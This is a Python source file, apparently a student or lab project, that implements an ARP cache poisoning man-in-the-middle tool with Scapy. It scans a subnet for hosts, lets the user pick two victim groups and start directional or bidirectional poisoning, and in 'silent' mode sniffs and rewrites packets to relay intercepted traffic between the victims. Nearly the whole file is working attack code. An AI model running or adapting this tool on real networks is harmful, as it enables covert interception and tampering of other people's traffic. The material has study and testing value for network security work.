from scapy.all import *
from poisoning import poisoning
import threading


class arp():

    def __init__(self, interface):
        self.interface = interface

    def getInput(self):
        #user enters what IP range to use
        self.ip_range = raw_input("Enter the range of IP addresses that you want to use (example: 192.168.5.85/24): ")
        
        #sends ARP packets to all ips in the range, -> we now know which ips are taken, and the MAC-address corresponding with every IP
        self.ips_used, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = self.ip_range), timeout=3, iface=self.interface)

        print("We received the following responses: ")
        index = 0
        print(" \t\t IP: \t MAC:")
        for packet_sent, packet_received in self.ips_used:
            print("{} \t {} \t {}".format(index, packet_received[ARP].psrc, packet_received[ARP].hwsrc))
            index = index + 1
    
        self.target = []
        #now we will select the targets
        mult_target = raw_input("Do you want to select targets manually (y) or select all IP's automatically (n): ")
        #case user manually selects targets
        if(mult_target == "y"):
            print("Enter the index nr of the targets you want to add to the target list, to quit entering input 'quit'")
            input = ""
            while(input != "quit"):
                input = raw_input()
                if(input != "quit"):
                    inputInt = int(input)
                    self.target.append({"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
        else:
            for packet_sent, packet_received in self.ips_used:
                self.target.append({"ip": packet_received[ARP].psrc, "mac": packet_received[ARP].hwsrc})
        #print(self.target)

        self.target2 = []
        #now we will select the target2
        mult_target = raw_input("Do you want to select target2 manually (y) or select all IP's automatically (n): ")
        #case user manually selects target2
        if(mult_target == "y"):
            print("Enter the index nr of the target you want to add to the target2 list, to quit entering input 'quit'")
            input = ""
            while(input != "quit"):
                input = raw_input()
                if(input != "quit"):
                    inputInt = int(input)
                    self.target2.append({"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
        else:
            for packet_sent, packet_received in self.ips_used:
                self.target2.append({"ip": packet_received[ARP].psrc, "mac": packet_received[ARP].hwsrc})
        #print(self.target2)
        
        #get own MAC address
        self.ownMAC = get_if_hwaddr(self.interface)

        #direction of the poisoning
        self.direction = ""
        while(self.direction != "y" and self.direction != "n"):
            self.direction = raw_input("Select bidirectional poisoning (y) or directional poisoning (n): ")
            if(self.direction != "y" and self.direction != "n"):
                print("Enter a valid input!")

        self.mode = ""
        while(self.mode != "silent" and self.mode != "loud"):
            self.mode = raw_input("Select poisoning mode (silent/loud): ")
            if(self.mode != "silent" and self.mode != "loud"):
                print("Enter a valid input!")

    def startProcess(self):
        #Now we will create and send the arp packets which will poison the caches.
        proc_thread = None
        process = poisoning(self.interface, self.target, self.target2, self.ownMAC, self.direction)
        proc_thread = threading.Thread(target=process.poisoning)
        proc_thread.daemon = True
        proc_thread.start()
        #now we will redirect packets correctly -> do not enable port forwarding on your device
        if(self.mode == "silent"):
            while True:
                sniff(store=0, prn=lambda packet: self.packetForwarding(packet), iface=self.interface)

    def packetForwarding(self, packet):
        #first we should check whether the packet satisfies the most basic requirement of having the IP + ether layer
        if(self.mode == "silent"):
            if packet.haslayer(Ether) and packet.haslayer(IP):
                sender = None
                senderfound = False
                receiver = None
                receiverfound = False
                #Finds the sender to be in target or target2 set
                for tar1 in self.target:
                    if(tar1["mac"] == packet[Ether].src):
                        sender = tar1
                        senderfound = True
                        for tar2 in self.target2:
                            if(tar2["ip"] == packet[IP].dst):
                                receiver = tar2
                                receiverfound = True
                if((not senderfound) or (not receiverfound)):
                    for tar2 in self.target2:
                        if(tar2["mac"] == packet[Ether].src):
                            sender = tar2
                            senderfound = True
                            for tar1 in self.target:
                                if(tar1["ip"] == packet[IP].dst):
                                    receiver = tar1
                                    receiverfound = True
                #now we will modify the packet and forward it
                if (senderfound and receiverfound):
                    packet[Ether].src = self.ownMAC
                    packet[Ether].dst = receiver["mac"]
                    sendp(packet, iface=self.interface)
                    print("we send packet from ip: {}, mac: {}, to ip: {}, mac: {}".format(sender["ip"], sender["mac"], receiver["ip"], receiver["mac"]))
            

    def setInput(self, ip_range, ips_used, target, target2, ownMAC, direction, mode):
        self.ip_range = ip_range
        self.ips_used = ips_used
        self.target = target
        self.target2 = target2
        self.ownMAC = ownMAC
        self.direction = direction
        self.mode = mode

        
